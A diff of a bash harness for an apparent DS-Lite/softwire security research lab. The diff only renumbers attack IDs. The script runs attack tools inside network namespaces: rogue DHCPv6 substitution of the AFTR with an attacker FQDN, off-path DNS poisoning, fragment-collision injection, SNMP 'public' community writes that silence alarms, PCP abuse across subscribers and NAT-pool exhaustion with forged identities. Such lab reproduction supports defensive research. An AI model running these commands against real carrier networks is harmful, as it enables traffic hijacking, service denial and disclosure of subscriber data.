@@ -31,7 +31,7 @@ CAP_MAX=4000
 
 nse() { ip netns exec "$@"; }
 # nsd: start a netns process detached so it survives the do_Tn function (used by
-# T8's off-path resolver scaffolding). setsid + redirected stdio so it does not
+# T10's off-path resolver scaffolding). setsid + redirected stdio so it does not
 # hold the terminal or get reaped when the calling step returns.
 nsd() { setsid ip netns exec "$@" </dev/null >/dev/null 2>&1 & }
 
@@ -69,7 +69,7 @@ note() { printf '  · %s\n' "$*"; }
 
 # ── shared state hygiene (mirror run.sh reset_aftr_state / capture reset) ───
 reset_state() {
-    pkill -9 -f 'nat_hold|nat_exhaustion|ICMPv6ND_NA|tunnel_spoof|reputation_poisoning|pcp_attack|fragment_attack|dhcpv6_hijack|t4_softwire_inject|t7_peer_crosssub' 2>/dev/null
+    pkill -9 -f 'nat_hold|nat_exhaustion|ICMPv6ND_NA|tunnel_spoof|reputation_poisoning|pcp_attack|fragment_attack|dhcpv6_hijack|t4_softwire_inject|t9_peer_crosssub' 2>/dev/null
     # Heal the softwire: re-add the ::b4N source (a DHCPv6 hijack/renewal can flush
     # it or the exit-hook can rebuild the tunnel from a DHCP-leased addr), then
     # force the tunnel local back to the stable ::b4N identity the AFTR expects.
@@ -119,7 +119,7 @@ urpf() {
         # NOTE: do NOT delete the SAVI bridge table here. uRPF (rp_filter) and
         # SAVI are two independent source-validation controls; deleting SAVI on
         # every forging-attack run silently disabled it, so a user who enabled
-        # SAVI to test it against T2/T4/T5 saw the attack "succeed". The clean
+        # SAVI to test it against T2/T4/T7 saw the attack "succeed". The clean
         # vulnerable baseline is established by restore_lab (all defenses off),
         # not by each attack tearing SAVI down.
     else
@@ -141,7 +141,7 @@ ensure_attacker_isp() {
         ip link set eth-isp-atk mtu 1500; ip link set atk-br mtu 1500
         ip link set eth-isp-atk netns attacker
         nse attacker ip link set eth-isp-atk name eth-isp
-        nse attacker ip link set eth-isp address 2a:29:47:aa:9c:56   # pinned MAC -> reproducible rogue-resolver link-local/SLAAC (paper Fig.1 & T9 capture)
+        nse attacker ip link set eth-isp address 2a:29:47:aa:9c:56   # pinned MAC -> reproducible rogue-resolver link-local/SLAAC (paper Fig.1 & T11 capture)
         ip link set atk-br master br-isp
         ip link set atk-br up
         nse attacker ip link set lo up
@@ -153,7 +153,7 @@ ensure_attacker_isp() {
     # ALWAYS (re)assert the carrier-bridge config that lets the on-path attacker
     # see other subscribers' softwire frames. This MUST run even when the attacker
     # already exists (e.g. created by capture_references.sh's prov_attacker), or
-    # the passive-sniff attacks (T3 interception, T5 IP-ID lock-on) capture nothing.
+    # the passive-sniff attacks (T3 interception, T7 IP-ID lock-on) capture nothing.
     # ageing_time 0 + flood on makes br-isp deliver unicast softwire frames to the
     # attacker port instead of only forwarding them between the B4 and AFTR ports.
     ip link set br-isp type bridge ageing_time 0 2>/dev/null
@@ -253,17 +253,17 @@ attack_name() {
         T2) echo "Softwire Endpoint Spoofing & On-Path MITM";;
         T3) echo "Unencrypted-Tunnel Interception";;
         T4) echo "Downstream Softwire Injection";;
-        T5) echo "Softwire Reassembly Poisoning";;
+        T7) echo "Softwire Reassembly Poisoning";;
         TS2) echo "PCP Port-Exhaustion DoS";;
-        T6) echo "Unauthorized THIRD_PARTY Forwarding";;
+        T8) echo "Unauthorized THIRD_PARTY Forwarding";;
         TS3) echo "PCP ANNOUNCE Spoof (Epoch Reset)";;
-        T7) echo "Cross-Subscriber PCP PEER + THIRD_PARTY";;
-        T8) echo "B4 DNS Cache Poisoning";;
-        T9) echo "Rogue AFTR Substitution";;
-        T9b) echo "Transparent AFTR Hijack";;
-        T10) echo "DS-Lite MIB Unauthenticated Access";;
-        T11) echo "Unauthenticated Softwire Decapsulation";;
-        T12) echo "Softwire Identity Multiplication";;
+        T9) echo "Cross-Subscriber PCP PEER + THIRD_PARTY";;
+        T10) echo "B4 DNS Cache Poisoning";;
+        T11) echo "Rogue AFTR Substitution";;
+        T11b) echo "Transparent AFTR Hijack";;
+        T12) echo "DS-Lite MIB Unauthenticated Access";;
+        T5) echo "Unauthenticated Softwire Decapsulation";;
+        T6) echo "Softwire Identity Multiplication";;
         *) echo "$1";;
     esac
 }
@@ -487,17 +487,17 @@ do_T4() {
 }
 
 # ─────────────────────────────────────────────────────────────────────────
-# T5 - Softwire Reassembly Poisoning (predictable-IP-ID fragment injection;
+# T7 - Softwire Reassembly Poisoning (predictable-IP-ID fragment injection;
 #      Gilad & Herzberg 2013: spoofed fragments sharing the victim's reassembly
 #      four-tuple collide with its genuine fragments at the AFTR -> victim DoS)
 # ─────────────────────────────────────────────────────────────────────────
-spec_T5() { echo "1-attacker-preseed|attacker|eth-isp|ip6 proto 4;2-aftr-collide|aftr|eth-isp|ip6 proto 4"; }
-knobs_T5() { echo "band:64|48; target:$SRV"; }
-do_T5() {
+spec_T7() { echo "1-attacker-preseed|attacker|eth-isp|ip6 proto 4;2-aftr-collide|aftr|eth-isp|ip6 proto 4"; }
+knobs_T7() { echo "band:64|48; target:$SRV"; }
+do_T7() {
     local outdir="$1" band tgt; band=$(knob_val BAND 64); tgt=$(knob_val TARGET "$SRV")
     urpf off; ensure_attacker_isp
     step "Surface: Fragment. The AFTR must reassemble the victim's oversized inner IPv4."
-    start_caps "$(spec_T5)" "$outdir" "T5"
+    start_caps "$(spec_T7)" "$outdir" "T7"
     step "Attack: collider LOCKS onto the victim's live inner IP-ID and tiles offset-0 holes just ahead of it."
     # The collider MUST sniff the victim's advancing inner IP-ID (its _id_tracker
     # thread) so each seeded offset-0 hole shares the victim's NEXT datagram ID,
@@ -554,15 +554,15 @@ co-resident probe: pcp_attack.py map --proxy-ip $GW1 --proto 17"
 }
 
 # ─────────────────────────────────────────────────────────────────────────
-# T6 - Unauthorized THIRD_PARTY Forwarding (open inbound to another subscriber)
+# T8 - Unauthorized THIRD_PARTY Forwarding (open inbound to another subscriber)
 # ─────────────────────────────────────────────────────────────────────────
-spec_T6() { echo "1-thirdparty-map|b4-1|eth-isp|udp port 5351;2-aftr-pcp|aftr|eth-isp|udp port 5351;3-inbound-to-victim|aftr|eth-wan|tcp"; }
-knobs_T6() { echo "victim:$C2"; }
-do_T6() {
+spec_T8() { echo "1-thirdparty-map|b4-1|eth-isp|udp port 5351;2-aftr-pcp|aftr|eth-isp|udp port 5351;3-inbound-to-victim|aftr|eth-wan|tcp"; }
+knobs_T8() { echo "victim:$C2"; }
+do_T8() {
     local outdir="$1" victim; victim=$(knob_val VICTIM "$C2")
     step "Surface: AFTR PCP THIRD_PARTY option (no ownership check)."
     nse aftr nft flush chain ip nat pcp_dnat 2>/dev/null
-    start_caps "$(spec_T6)" "$outdir" "T6"
+    start_caps "$(spec_T8)" "$outdir" "T8"
     step "Attack: a B4-1 host installs a THIRD_PARTY MAP naming a DIFFERENT subscriber ($victim)."
     local cmd="python3 $T/infra/pcp_attack.py thirdparty --proxy-ip $GW1 --target-internal $victim"
     CMDS_RUN="client1: $cmd"
@@ -626,34 +626,34 @@ do_TS3() {
 }
 
 # ─────────────────────────────────────────────────────────────────────────
-# T7 - Cross-Subscriber PCP PEER Enumeration (leak another sub's NAT ports)
+# T9 - Cross-Subscriber PCP PEER Enumeration (leak another sub's NAT ports)
 # ─────────────────────────────────────────────────────────────────────────
-spec_T7() { echo "1-cross-sub-peer-leak|b4-1|eth-isp|udp port 5351;2-aftr-pcp|aftr|eth-isp|udp port 5351"; }
-knobs_T7() { echo "trials:2|3; flows:3"; }
-do_T7() {
+spec_T9() { echo "1-cross-sub-peer-leak|b4-1|eth-isp|udp port 5351;2-aftr-pcp|aftr|eth-isp|udp port 5351"; }
+knobs_T9() { echo "trials:2|3; flows:3"; }
+do_T9() {
     local outdir="$1" trials flows; trials=$(knob_val TRIALS 2); flows=$(knob_val FLOWS 3)
     restart_pcp 1024
     step "Surface: AFTR PCP PEER operation (returns external IP:port for a flow)."
-    start_caps "$(spec_T7)" "$outdir" "T7"
+    start_caps "$(spec_T9)" "$outdir" "T9"
     step "Attack: a B4-1 host abuses PEER to learn a DIFFERENT subscriber's external ports."
-    local cmd="python3 $T/infra/t7_peer_crosssub.py --trials $trials --flows $flows"
+    local cmd="python3 $T/infra/t9_peer_crosssub.py --trials $trials --flows $flows"
     CMDS_RUN="b4-1: $cmd"
     local out; out=$(nse b4-1 sh -c "timeout 40 $cmd 2>&1")
     echo "$out" | grep -iE 'wildcard_leak|verdict|trials passed|SUCCESS|precision' | sed 's/^/      /'
     stop_caps; cap_summary
     step "Measure: did the tool confirm a cross-subscriber leak (leaked port == real port)?"
-    local ok=0; echo "$out" | grep -qiE 'T7 SUCCESS' && ok=1
+    local ok=0; echo "$out" | grep -qiE 'T9 SUCCESS' && ok=1
     REF_LINE="cross-subscriber observation-isolation broken (leaked external port == victim's real port)"
     RUN_LINE="$(echo "$out" | grep -iE 'trials passed|aggregate TP' | tr '\n' ' ' | sed 's/  */ /g')"
     VERDICT_PASS=$ok
 }
 
 # ─────────────────────────────────────────────────────────────────────────
-# T8 - Softwire DNS-Discovery Hijack (off-path poison of the B4's RFC-6334
+# T10 - Softwire DNS-Discovery Hijack (off-path poison of the B4's RFC-6334
 #       AFTR-FQDN resolution -> exit-hook rebuilds the softwire to the attacker)
 # ─────────────────────────────────────────────────────────────────────────
-spec_T8() { echo "1-offpath-flood|attacker|eth-isp|udp port 53;2-b4-resolver|b4-1|eth-isp|udp port 53"; }
-knobs_T8() { echo "rounds:2|4"; }
+spec_T10() { echo "1-offpath-flood|attacker|eth-isp|udp port 53;2-b4-resolver|b4-1|eth-isp|udp port 53"; }
+knobs_T10() { echo "rounds:2|4"; }
 # Off-path (SADDNS/Kaminsky) poisoning of the B4's AFTR-FQDN resolution. The
 # attacker is OFF-PATH and cannot see the query; it is granted the resolver's
 # upstream source port (the SADDNS ICMP-rate-limit side channel derandomises it -
@@ -691,7 +691,7 @@ _t11_resolver_down() {
         --address=/client1.dslite.example.com/10.0.1.100 --proxy-dnssec \
         --log-facility=/var/log/dnsmasq.log --pid-file=/var/run/dnsmasq-b4-1.pid 2>/dev/null
 }
-do_T8() {
+do_T10() {
     local outdir="$1" rounds dom; rounds=$(knob_val ROUNDS 2); dom=aftr.dslite.example.com
     ensure_attacker_isp
     local zx; zx=$(nse b4-1 cat /run/t11-0x20-mode 2>/dev/null | tr -d '[:space:]'); zx="${zx:-0}"
@@ -703,7 +703,7 @@ do_T8() {
         info "0x20 case-randomisation at the B4 resolver = $([ "$zx" = 1 ] && echo ON || echo OFF)"
     fi
     _t11_resolver_up "$zx" "$ck"
-    start_caps "$(spec_T8)" "$outdir" "T8"
+    start_caps "$(spec_T10)" "$outdir" "T10"
     step "Victim B4 resolves the AFTR FQDN (query hangs on the slow upstream = wide window)."
     nse b4-1 sh -c "dig AAAA $dom @::1 -p 5354 +time=9 +tries=1 >/dev/null 2>&1 &"
     sleep 0.6
@@ -723,13 +723,13 @@ do_T8() {
 }
 
 # ─────────────────────────────────────────────────────────────────────────
-# T9 - Rogue AFTR Substitution (DHCPv6 Option 64 -> attacker FQDN)
+# T11 - Rogue AFTR Substitution (DHCPv6 Option 64 -> attacker FQDN)
 # ─────────────────────────────────────────────────────────────────────────
-spec_T9() { echo "1-rogue-dhcpv6|attacker|eth-isp|udp port 546 or udp port 547;2-b4-receives|b4-1|eth-isp|udp port 546 or udp port 547;3-victim-tunnels-to-attacker|attacker|eth-isp|ip6 proto 4"; }
-knobs_T9() { echo "fqdn:aftr-evil.attacker.example"; }
+spec_T11() { echo "1-rogue-dhcpv6|attacker|eth-isp|udp port 546 or udp port 547;2-b4-receives|b4-1|eth-isp|udp port 546 or udp port 547;3-victim-tunnels-to-attacker|attacker|eth-isp|ip6 proto 4"; }
+knobs_T11() { echo "fqdn:aftr-evil.attacker.example"; }
 # the remote endpoint a B4's ds-lite softwire currently points at
 _tun_remote() { nse "$1" ip -6 tunnel show ds-lite 2>/dev/null | grep -oE 'remote [0-9a-f:]+' | awk '{print $2}'; }
-# After a softwire-redirect (T9/T9) the B4's tunnel remote points at the
+# After a softwire-redirect (T11/T11) the B4's tunnel remote points at the
 # attacker. Two things make the diversion observable AT the attacker reliably:
 #  (1) prime the B4->attacker neighbor - otherwise the first encapsulated frames
 #      are dropped while NDP resolves and a one-shot probe ends before it does
@@ -759,15 +759,15 @@ _heal_softwire() {
     nse b4-1 ip -6 tunnel change ds-lite remote $AFTR local $VB4 2>/dev/null
     nse b4-1 sh -c "echo ${AFTR_LEGIT:-aftr.dslite.example.com.} > /run/ds-lite-aftr-name" 2>/dev/null
 }
-do_T9() {
+do_T11() {
     local outdir="$1" fq; fq=$(knob_val FQDN aftr-evil.attacker.example)
     ensure_attacker_isp
     step "Surface: DHCPv6 AFTR-Name (Option 64). The B4 trusts whoever answers first."
     local pre_remote; pre_remote=$(_tun_remote b4-1)
     info "before: B4 softwire remote = $pre_remote (the real AFTR)"
-    start_caps "$(spec_T9)" "$outdir" "T9"
+    start_caps "$(spec_T11)" "$outdir" "T11"
     step "Attack: rogue DHCPv6 server advertises a NEW attacker AFTR name ($fq)."
-    local cmd="python3 $T/infra/dhcpv6_hijack.py dhcp --interface eth-isp --attack-id T9 --attacker-ip6 $ATK6 --fake-aftr-fqdn $fq --fake-aftr-ip6 $ATK6 --auto-trigger-victim b4-1"
+    local cmd="python3 $T/infra/dhcpv6_hijack.py dhcp --interface eth-isp --attack-id T11 --attacker-ip6 $ATK6 --fake-aftr-fqdn $fq --fake-aftr-ip6 $ATK6 --auto-trigger-victim b4-1"
     CMDS_RUN="attacker: $cmd"
     nse attacker sh -c "timeout 16 $cmd >/dev/null 2>&1"
     sleep 2
@@ -779,7 +779,7 @@ do_T9() {
     local v1; v1=$(_drive_victim_to_attacker client1)
     info "victim client1 internet = HTTP $v1 (attacker is not a real AFTR)"
     stop_caps; cap_summary
-    local got; got=$(pcap_count "$outdir/T9_3-victim-tunnels-to-attacker.pcap" "ip6 proto 4")
+    local got; got=$(pcap_count "$outdir/T11_3-victim-tunnels-to-attacker.pcap" "ip6 proto 4")
     info "victim softwire frames captured arriving at the attacker = $got"
     _heal_softwire
     REF_LINE="B4 adopts attacker name ($fq) AND rebuilds its softwire to the attacker ($ATK6); victim loses service"
@@ -788,19 +788,19 @@ do_T9() {
 }
 
 # ─────────────────────────────────────────────────────────────────────────
-# T9 - Transparent AFTR Hijack (keep the legit name, poison it to attacker IP)
+# T11 - Transparent AFTR Hijack (keep the legit name, poison it to attacker IP)
 # ─────────────────────────────────────────────────────────────────────────
-spec_T9b() { echo "1-rogue-dns|attacker|eth-isp|udp port 546 or udp port 547 or udp port 53;2-b4-receives|b4-1|eth-isp|udp port 546 or udp port 547 or udp port 53;3-victim-tunnels-to-attacker|attacker|eth-isp|ip6 proto 4"; }
-knobs_T9b() { echo "fqdn:aftr.dslite.example.com"; }
-do_T9b() {
+spec_T11b() { echo "1-rogue-dns|attacker|eth-isp|udp port 546 or udp port 547 or udp port 53;2-b4-receives|b4-1|eth-isp|udp port 546 or udp port 547 or udp port 53;3-victim-tunnels-to-attacker|attacker|eth-isp|ip6 proto 4"; }
+knobs_T11b() { echo "fqdn:aftr.dslite.example.com"; }
+do_T11b() {
     local outdir="$1" fq; fq=$(knob_val FQDN aftr.dslite.example.com)
     ensure_attacker_isp
     step "Surface: DHCPv6 + DNS. Keep the legit AFTR name but make it resolve to the attacker."
     local pre_remote; pre_remote=$(_tun_remote b4-1)
     info "before: B4 softwire remote = $pre_remote (the real AFTR), name = $(nse b4-1 cat /run/ds-lite-aftr-name 2>/dev/null|tr -d '[:space:]')"
-    start_caps "$(spec_T9b)" "$outdir" "T9b"
+    start_caps "$(spec_T11b)" "$outdir" "T11b"
     step "Attack: rogue server keeps name $fq but binds it to the attacker ($ATK6)."
-    local cmd="python3 $T/infra/dhcpv6_hijack.py dhcp --interface eth-isp --attack-id T9 --attacker-ip6 $ATK6 --fake-aftr-fqdn $fq --fake-aftr-ip6 $ATK6 --auto-trigger-victim b4-1"
+    local cmd="python3 $T/infra/dhcpv6_hijack.py dhcp --interface eth-isp --attack-id T11 --attacker-ip6 $ATK6 --fake-aftr-fqdn $fq --fake-aftr-ip6 $ATK6 --auto-trigger-victim b4-1"
     CMDS_RUN="attacker: $cmd"
     nse attacker sh -c "timeout 16 $cmd >/dev/null 2>&1"
     sleep 2
@@ -812,7 +812,7 @@ do_T9b() {
     local v1; v1=$(_drive_victim_to_attacker client1)
     info "victim client1 internet = HTTP $v1 (attacker is not a real AFTR -> denial)"
     stop_caps; cap_summary
-    local got; got=$(pcap_count "$outdir/T9b_3-victim-tunnels-to-attacker.pcap" "ip6 proto 4")
+    local got; got=$(pcap_count "$outdir/T11b_3-victim-tunnels-to-attacker.pcap" "ip6 proto 4")
     info "victim softwire frames captured arriving at the attacker = $got"
     _heal_softwire
     REF_LINE="name stays $fq (legit) but the softwire is rebuilt to the attacker ($ATK6); victim traffic diverted to the attacker"
@@ -821,14 +821,14 @@ do_T9b() {
 }
 
 # ─────────────────────────────────────────────────────────────────────────
-# T10 - DS-Lite MIB unauthenticated access: default community grants an
+# T12 - DS-Lite MIB unauthenticated access: default community grants an
 #       alarm-threshold WRITE (blinds the NOC) and a bind-table READ (discloses
 #       every subscriber's private connections). RFC 7870 defines the MIB; §9
 #       mandates SNMPv3 USM, disabled in the default build.
 # ─────────────────────────────────────────────────────────────────────────
-spec_T10() { echo "1-snmp-set|aftr|eth-mgmt|udp port 161;2-mgmt-station|mgmt|eth-mgmt|udp port 161"; }
-knobs_T10() { echo "value:2147483647"; }
-do_T10() {
+spec_T12() { echo "1-snmp-set|aftr|eth-mgmt|udp port 161;2-mgmt-station|mgmt|eth-mgmt|udp port 161"; }
+knobs_T12() { echo "value:2147483647"; }
+do_T12() {
     # RFC 7870 §8: dsliteAFTRAlarmPortNumber (.240.1.3.1.8) is an UNCONSTRAINED
     # Integer32 per-user NAT-port alarm threshold. Raising it to Integer32-max
     # disables the alarm that would otherwise flag a port-exhaustion attack.
@@ -842,7 +842,7 @@ do_T10() {
     nse mgmt snmpset -v2c -c public -t1 10.99.0.1 $oid i 1000 >/dev/null 2>&1   # NOC enables the per-user port alarm
     local base; base=$(nse mgmt snmpget -v2c -c public -t1 10.99.0.1 $oid 2>/dev/null | grep -oE '\-?[0-9]+$')
     step "Baseline: dsliteAFTRAlarmPortNumber = ${base:-?} (NOC's per-user NAT-port alarm)."
-    start_caps "$(spec_T10)" "$outdir" "T10"
+    start_caps "$(spec_T12)" "$outdir" "T12"
     step "Attack (write): a mgmt-reachable host raises the port-usage alarm to Integer32 max so it never fires."
     local cmd="python3 $T/infra/snmp_attack.py set --target 10.99.0.1 --oid alarmPortNumber --value $val"
     nse mgmt sh -c "timeout 10 $cmd >/dev/null 2>&1"
@@ -869,7 +869,7 @@ do_T10() {
 }
 
 # ─────────────────────────────────────────────────────────────────────────
-# T11 - Unauthenticated softwire decapsulation (RFC 6333 defines no B4
+# T5 - Unauthenticated softwire decapsulation (RFC 6333 defines no B4
 #       authentication, so the wildcard softwire decapsulates 4in6 from any
 #       source; an UNPROVISIONED carrier host relays IPv4 to the Internet
 #       laundered as the shared public IPv4. CVE-2025-23018 / VU#199397 class,
@@ -877,14 +877,14 @@ do_T10() {
 #       the upstream complement to T4. The DS-Lite-specific §6.6 overlap-routing
 #       amplification loop the same surface harbors is measured under DECAP_BIND.)
 # ─────────────────────────────────────────────────────────────────────────
-spec_T11() { echo "1-attacker-4in6|attacker|eth-isp|ip6 proto 4;2-aftr-egress|aftr|eth-wan|host $SRV"; }
-knobs_T11() { echo "count:8|20; isrc:10.66.66.66"; }
-do_T11() {
+spec_T5() { echo "1-attacker-4in6|attacker|eth-isp|ip6 proto 4;2-aftr-egress|aftr|eth-wan|host $SRV"; }
+knobs_T5() { echo "count:8|20; isrc:10.66.66.66"; }
+do_T5() {
     local outdir="$1" cnt isrc; cnt=$(knob_val COUNT 8); isrc=$(knob_val ISRC 10.66.66.66)
     urpf off; ensure_attacker_isp
     step "Surface: AFTR softwire ingress. RFC 6333 authenticates no B4, so the wildcard softwire decapsulates 4in6 from any carrier source."
     nse attacker ping6 -c 1 -W 1 "$AFTR" >/dev/null 2>&1   # warm ND so the crafted 4in6 resolves the AFTR MAC (reset_state flushes it)
-    start_caps "$(spec_T11)" "$outdir" "T11"
+    start_caps "$(spec_T5)" "$outdir" "T5"
     sleep 2   # let the pcap sniffers attach before the burst (start_caps window)
     step "Attack: an UNPROVISIONED carrier host (no DHCPv6/PCP) sends 4in6 to the AFTR ($AFTR), inner $isrc -> Internet $SRV."
     info "the AFTR decapsulates, NATs the inner packet to the shared public IPv4 ($SHARED), and forwards it - an open one-way proxy."
@@ -894,7 +894,7 @@ do_T11() {
     sleep 1
     stop_caps; cap_summary
     step "Measure: do the relayed packets egress the AFTR's public side laundered as the shared IPv4 ($SHARED -> $SRV)?"
-    local wan rel; wan="$outdir/T11_2-aftr-egress.pcap"
+    local wan rel; wan="$outdir/T5_2-aftr-egress.pcap"
     rel=$(pcap_count "$wan" "src $SHARED and dst $SRV")
     info "relayed packets leaving the AFTR as the shared public IPv4 = $rel"
     REF_LINE="an unprovisioned host relays IPv4 to the Internet through the AFTR, laundered as the shared public IPv4 (>0)"
@@ -903,16 +903,16 @@ do_T11() {
 }
 
 # ─────────────────────────────────────────────────────────────────────────
-# T12 - Softwire Identity Multiplication (paper: "Softwire source spoofing"). RFC 6333 authenticates no B4, so the
+# T6 - Softwire Identity Multiplication (paper: "Softwire source spoofing"). RFC 6333 authenticates no B4, so the
 #       RFC 6888 per-subscriber cap keys on the FORGEABLE outer IPv6 source. A
 #       single identity is capped at 2000 bindings and cannot exhaust the shared
 #       64,512-port pool (this is T1's "isolation holds"); MANY forged identities
 #       drain the pool for a targeted endpoint and deny co-subscribers, the
 #       positive counterpart to the T1 negative finding. Closed by SAVI (D3).
 # ─────────────────────────────────────────────────────────────────────────
-spec_T12() { echo "1-attacker-4in6|attacker|eth-isp|ip6 proto 4;2-aftr-egress|aftr|eth-wan|host $SRV"; }
-knobs_T12() { echo "dport:80"; }
-do_T12() {
+spec_T6() { echo "1-attacker-4in6|attacker|eth-isp|ip6 proto 4;2-aftr-egress|aftr|eth-wan|host $SRV"; }
+knobs_T6() { echo "dport:80"; }
+do_T6() {
     local outdir="$1" dport pfx; dport=$(knob_val DPORT 80); pfx="${C_PREFIX}:dead::/64"
     urpf off; ensure_attacker_isp
     step "Surface: AFTR NAT/CGN shared port pool (RFC 6888 per-subscriber cap keyed on the forgeable softwire identity)."
@@ -930,7 +930,7 @@ do_T12() {
     info "ONE identity: pool(->:$dport)=$pool1 (capped ~2000) -> client1=$c1 client2=$c2  [co-residents UP, isolation holds]"
     nse attacker pkill -9 -f nat_exhaustion 2>/dev/null; nse aftr conntrack -F >/dev/null 2>&1; sleep 2
     # ── ATTACK: MANY forged identities -> fill the shared pool -> co-residents denied ──
-    start_caps "$(spec_T12)" "$outdir" "T12"
+    start_caps "$(spec_T6)" "$outdir" "T6"
     step "Attack: MANY forged softwire identities (prefix $pfx) pinned to :$dport drain the shared pool."
     local cmd="python3 $T/nat/nat_exhaustion.py eth-isp --tunnel --src-ip6-prefix $pfx --fixed-dport $dport --proto tcp --dst-ip4 $SRV --aftr-ip6 $AFTR --inner-src-prefix 10.90.0.0/16 --threads 8 --batch 256"
     CMDS_RUN="attacker CONTROL: one --src-ip6 identity (capped)
